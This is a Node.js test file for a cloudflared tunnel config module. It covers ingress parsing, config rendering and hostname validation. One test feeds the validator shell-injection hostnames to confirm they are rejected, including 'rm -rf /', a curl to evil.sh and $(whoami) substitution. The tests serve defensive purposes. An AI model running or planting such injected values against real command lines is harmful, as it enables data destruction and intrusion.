'use strict';
const { test } = require('node:test');
const assert = require('node:assert');
const T = require('./tunnel');

const OURS = `tunnel: 8f1c9e64-1111-2222-3333-444455556666
credentials-file: /home/u/.cloudflared/8f1c9e64-1111-2222-3333-444455556666.json

ingress:
  - hostname: n8n.example.com
    service: http://localhost:5678
  - service: http_status:404

metrics: 127.0.0.1:0
`;

// ─── Reading ─────────────────────────────────────────────────────────────

test('parses a config this family wrote', () => {
  const cfg = T.parseTunnelConfig(OURS);
  assert.strictEqual(cfg.tunnel, '8f1c9e64-1111-2222-3333-444455556666');
  assert.strictEqual(T.findIngress(cfg, { scheme: 'http', port: 5678 }), 'n8n.example.com');
});

test('parses an entry with the keys in the OTHER order', () => {
  // Valid YAML that cloudflared honours. The shipped build matched the
  // `service:` line and read the hostname from the line ABOVE it, so this read
  // as "no tunnel configured" and the app offered to create a second tunnel
  // over a working one.
  const cfg = T.parseTunnelConfig(`tunnel: abc
ingress:
  - service: http://localhost:5678
    hostname: n8n.example.com
  - service: http_status:404
`);
  assert.strictEqual(T.findIngress(cfg, { scheme: 'http', port: 5678 }), 'n8n.example.com');
});

test('COOLIFY: reads both of two ingress entries', () => {
  // The case a single-service API would have broken.
  const cfg = T.parseTunnelConfig(`tunnel: abc
credentials-file: /c/abc.json

ingress:
  - hostname: coolify.example.com
    service: http://localhost:8000
  - hostname: ssh.example.com
    service: ssh://localhost:2222
  - service: http_status:404
`);
  assert.strictEqual(cfg.ingress.length, 3);
  assert.strictEqual(T.findIngress(cfg, { scheme: 'http', port: 8000 }), 'coolify.example.com');
  assert.strictEqual(T.findIngress(cfg, { scheme: 'ssh', port: 2222 }), 'ssh.example.com');
});

test('findIngress matches on BOTH scheme and port', () => {
  // A shared cloudflared config must not hand back another app's hostname.
  const cfg = T.parseTunnelConfig(`tunnel: abc
ingress:
  - hostname: grafana.example.com
    service: http://localhost:3000
  - hostname: mc.example.com
    service: udp://localhost:19132
  - service: http_status:404
`);
  assert.strictEqual(T.findIngress(cfg, { scheme: 'udp', port: 19132 }), 'mc.example.com');
  assert.strictEqual(T.findIngress(cfg, { scheme: 'http', port: 19132 }), null,
    'right port, wrong scheme — a udp game cannot ride an http ingress');
  assert.strictEqual(T.findIngress(cfg, { scheme: 'http', port: 5678 }), null);
});

test('127.0.0.1 and localhost are the same service', () => {
  const cfg = T.parseTunnelConfig(`tunnel: abc
ingress:
  - hostname: mc.example.com
    service: udp://127.0.0.1:19132
  - service: http_status:404
`);
  assert.strictEqual(T.findIngress(cfg, { scheme: 'udp', port: 19132 }), 'mc.example.com');
});

test('comments and quotes are stripped from a hostname', () => {
  const cfg = T.parseTunnelConfig(`tunnel: abc
ingress:
  - hostname: "n8n.example.com"   # the editor
    service: http://localhost:5678
  - service: http_status:404
`);
  assert.strictEqual(T.findIngress(cfg, { scheme: 'http', port: 5678 }), 'n8n.example.com');
});

test('junk reads as not-configured instead of throwing', () => {
  for (const input of ['', null, undefined, '\t\n', 'not yaml at all', 'ingress:\n  - \n']) {
    const cfg = T.parseTunnelConfig(input);
    assert.strictEqual(cfg.tunnel, null, String(input));
    assert.strictEqual(T.isConfigured(cfg, [{ scheme: 'http', port: 1 }]), false);
  }
});

test('isConfigured needs a tunnel id AND every declared service', () => {
  // An id with no hostname routes nothing; a hostname with no id cannot run.
  const both = T.parseTunnelConfig(`tunnel: abc
ingress:
  - hostname: a.example.com
    service: http://localhost:8000
  - hostname: b.example.com
    service: ssh://localhost:2222
  - service: http_status:404
`);
  const services = [{ scheme: 'http', port: 8000 }, { scheme: 'ssh', port: 2222 }];
  assert.strictEqual(T.isConfigured(both, services), true);

  const onlyHttp = T.parseTunnelConfig(`tunnel: abc
ingress:
  - hostname: a.example.com
    service: http://localhost:8000
  - service: http_status:404
`);
  assert.strictEqual(T.isConfigured(onlyHttp, services), false,
    'a partially configured two-service tunnel is not configured');
  assert.strictEqual(T.isConfigured(onlyHttp, [services[0]]), true);

  // Hostnames present but no `tunnel:` line — routes nothing, cannot be run.
  const noId = T.parseTunnelConfig(`ingress:
  - hostname: a.example.com
    service: http://localhost:8000
  - service: http_status:404
`);
  assert.strictEqual(T.findIngress(noId, services[0]), 'a.example.com',
    'the hostname really is there');
  assert.strictEqual(T.isConfigured(noId, [services[0]]), false,
    'a tunnel with no id cannot be run, however complete its ingress');
});

// ─── Writing ─────────────────────────────────────────────────────────────

test('render round-trips through the parser, for one service and for two', () => {
  const one = T.renderTunnelConfig({
    tunnelId: 'x',
    credentialsFile: '/c/x.json',
    ingress: [{ hostname: 'mc.example.com', scheme: 'udp', port: 19132 }],
  });
  assert.strictEqual(
    T.findIngress(T.parseTunnelConfig(one), { scheme: 'udp', port: 19132 }), 'mc.example.com');

  const two = T.renderTunnelConfig({
    tunnelId: 'y',
    credentialsFile: '/c/y.json',
    ingress: [
      { hostname: 'app.example.com', scheme: 'http', port: 8000 },
      { hostname: 'ssh.example.com', scheme: 'ssh', port: 2222 },
    ],
  });
  const cfg = T.parseTunnelConfig(two);
  assert.strictEqual(T.findIngress(cfg, { scheme: 'http', port: 8000 }), 'app.example.com');
  assert.strictEqual(T.findIngress(cfg, { scheme: 'ssh', port: 2222 }), 'ssh.example.com');
});

test('render always ends with the mandatory catch-all', () => {
  // cloudflared refuses to start a config whose ingress has no final
  // catch-all rule.
  const cfg = T.parseTunnelConfig(T.renderTunnelConfig({
    tunnelId: 'x',
    credentialsFile: '/c/x.json',
    ingress: [{ hostname: 'h.example.com', scheme: 'http', port: 1 }],
  }));
  assert.strictEqual(cfg.ingress[cfg.ingress.length - 1].service, T.CLOUDFLARED_SERVICE_404);
});

test('render refuses a config that cannot work', () => {
  const ing = [{ hostname: 'h.example.com', scheme: 'http', port: 1 }];
  assert.throws(() => T.renderTunnelConfig({ credentialsFile: '/c', ingress: ing }), /tunnelId/);
  assert.throws(() => T.renderTunnelConfig({ tunnelId: 'x', credentialsFile: '/c', ingress: [] }), /ingress/);
  assert.throws(() => T.renderTunnelConfig({
    tunnelId: 'x', credentialsFile: '/c', ingress: [{ scheme: 'http', port: 1 }],
  }), /hostname/);
});

// ─── Values that reach a command line ────────────────────────────────────

test('parseTunnelId extracts the UUID cloudflared reports', () => {
  assert.strictEqual(
    T.parseTunnelId('Created tunnel mentat with id 8f1c9e64-1111-2222-3333-444455556666'),
    '8f1c9e64-1111-2222-3333-444455556666');
  assert.strictEqual(T.parseTunnelId('something went wrong'), null);
  assert.strictEqual(T.parseTunnelId(''), null);
});

test('isValidHostname accepts real hostnames', () => {
  for (const h of ['n8n.example.com', 'a.b.c.example.co.uk', 'mc-1.example.com']) {
    assert.strictEqual(T.isValidHostname(h), true, h);
  }
});

test('isValidHostname rejects shell metacharacters', () => {
  // This value reaches `cloudflared tunnel route dns` and a generated config.
  for (const h of [
    'n8n.example.com; rm -rf /', 'a && curl evil.sh', '$(whoami).example.com',
    'a`id`.example.com', 'a | tee /tmp/x', 'host name.example.com',
  ]) {
    assert.strictEqual(T.isValidHostname(h), false, h);
  }
});

test('isValidHostname rejects malformed names', () => {
  for (const h of ['', '   ', 'localhost', 'a.example.com.', '-bad.example.com', 'a'.repeat(300), null, 42]) {
    assert.strictEqual(T.isValidHostname(h), false, String(h));
  }
});

test('isTunnelConnectedLine only fires on the edge registration line', () => {
  assert.strictEqual(T.isTunnelConnectedLine('INF Registered tunnel connection connIndex=0'), true);
  assert.strictEqual(T.isTunnelConnectedLine('INF Starting tunnel'), false);
  assert.strictEqual(T.isTunnelConnectedLine(undefined), false);
});
